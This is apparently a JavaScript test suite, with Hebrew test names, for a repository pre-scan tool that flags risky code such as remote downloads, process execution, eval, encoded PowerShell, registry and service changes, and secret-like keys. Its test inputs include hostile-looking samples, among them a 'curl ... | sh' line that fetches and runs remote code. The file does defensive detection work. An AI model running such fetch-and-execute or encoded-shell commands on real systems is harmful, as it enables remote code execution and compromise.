import assert from 'node:assert/strict'
import { mkdir, writeFile } from 'node:fs/promises'
import path from 'node:path'
import { test } from 'node:test'
import { buildHotspots, classifyPath, scanText } from '../src/prescan.js'
import { tempDir } from './helpers.mjs'

const rules = (text) => new Set(scanText(text).map((h) => h.rule))

test('סיווג נתיבים: workflow, build, dependency', () => {
  assert.deepEqual(classifyPath('o/r/.github/workflows/release.yml'), ['workflow'])
  assert.deepEqual(classifyPath('o/r/package.json'), ['dependency'])
  assert.deepEqual(classifyPath('o/r/installer/setup.nsi'), ['build'])
  assert.deepEqual(classifyPath('o/r/Cargo.lock'), ['dependency'])
  assert.deepEqual(classifyPath('o/r/requirements-dev.txt'), ['dependency'])
  assert.deepEqual(classifyPath('o/r/src/main.rs'), [])
})

test('כללי הסינון מזהים את הדפוסים הרלוונטיים', () => {
  assert.ok(rules('const r = await fetch(url)').has('network_download'))
  assert.ok(rules('Invoke-WebRequest -Uri $u -OutFile x.exe').has('network_download'))
  assert.ok(rules("require('child_process').execSync(cmd)").has('process_exec'))
  assert.ok(rules('eval(payload)').has('dynamic_code'))
  assert.ok(rules('Start-Process powershell -EncodedCommand AAA').has('shell'))
  assert.ok(rules('const u = "https://example.com/update.exe"').has('hardcoded_url'))
  assert.ok(!rules('const u = "http://127.0.0.1:18090/x"').has('hardcoded_url'))
  assert.ok(rules('Registry.SetValue(@"HKEY_CURRENT_USER\\Software", "x", 1)').has('registry'))
  assert.ok(rules('sc.exe create MySvc binPath= x').has('service_or_elevation'))
  assert.ok(rules("server.listen(18090, '0.0.0.0')").has('non_loopback_listen'))
  assert.ok(rules('key = "AKIAABCDEFGHIJKLMNOP"').has('secret_like'))
  assert.ok(rules('x'.repeat(2000)).has('long_line'))
})

test('נקודת הזיהוי: שורות Host/Origin בקובץ שמזכיר otzaria-service', () => {
  const text = "app.get('/.well-known/otzaria-service', h)\nconst host = req.headers.host\nunrelated()\n"
  const hits = scanText(text).filter((h) => h.rule === 'detection_endpoint_host_origin').map((h) => h.line)
  assert.deepEqual(hits, [1, 2])
})

test('HOTSPOTS כולל תמיד workflow/build/dependency וקבצים שאינם טקסט', async (t) => {
  const dir = await tempDir(t)
  await mkdir(dir, { recursive: true })
  await writeFile(path.join(dir, '1.txt'), 'name: build\nrun: curl https://x.example/tool | sh\n')
  await writeFile(path.join(dir, '2.txt'), 'fn main() {}\n')
  const rows = [
    { n: 1, path: 'o/r/.github/workflows/build.yml', kind: 'text' },
    { n: 2, path: 'o/r/src/main.rs', kind: 'text' },
    { n: null, path: 'o/r/vendor/tool.exe', kind: 'binary' },
    { n: null, path: 'o/r/link', kind: 'symlink' },
  ]
  const hs = await buildHotspots(rows, dir)
  assert.match(hs.text, /^1\to\/r\/\.github\/workflows\/build\.yml\t0\talways_review:workflow$/m)
  assert.match(hs.text, /^1\t.*\t2\tnetwork_download$/m)
  assert.match(hs.text, /^-\to\/r\/vendor\/tool\.exe\t0\tnon_text:binary$/m)
  assert.match(hs.text, /non_text:symlink/)
  assert.doesNotMatch(hs.text, /main\.rs/)
})

test('הגדרות git תמיד ב-HOTSPOTS; תקרה לכל כלל מסומנת; חריגה מהתקרה הכוללת מוחזרת ולא מקוצרת בשקט', async (t) => {
  assert.deepEqual(classifyPath('o/r/.gitattributes'), ['git'])
  assert.deepEqual(classifyPath('o/r/sub/.gitmodules'), ['git'])
  assert.deepEqual(classifyPath('o/r/.lfsconfig'), ['git'])
  const many = Array.from({ length: 45 }, () => 'fetch(u)').join('\n')
  const hits = scanText(many).filter((h) => h.rule.startsWith('network_download'))
  assert.equal(hits.length, 41)
  assert.deepEqual(hits.at(-1), { line: 0, rule: 'network_download:more_than_40' })

  const dir = await tempDir(t)
  await writeFile(path.join(dir, '1.txt'), 'fetch(a)\neval(b)\n')
  const rows = [{ n: 1, path: 'o/r/a.js', kind: 'text' }, { n: null, path: 'o/r/.gitattributes', kind: 'text' }]
  const small = await buildHotspots(rows, dir, { maxLines: 2 })
  assert.equal(small.overLimit, true)
  const full = await buildHotspots(rows, dir)
  assert.equal(full.overLimit, false)
  assert.match(full.text, /\.gitattributes\t0\talways_review:git$/m)
})
